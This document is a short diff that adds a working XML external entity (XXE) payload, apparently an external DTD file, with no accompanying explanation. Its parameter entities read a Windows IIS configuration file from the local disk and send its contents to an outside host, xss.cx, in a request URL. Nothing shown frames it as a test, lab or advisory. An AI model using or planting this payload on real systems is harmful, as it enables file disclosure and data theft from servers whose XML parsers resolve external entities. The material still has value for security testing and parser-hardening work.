@@ -1,0 +1,3 @@
+<!ENTITY % p1 SYSTEM "file:///WINDOWS/System32/inetsrv/config/schema/ASPNET_schema.xml">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'https://xss.cx/?%p1;'>">
+%p2;
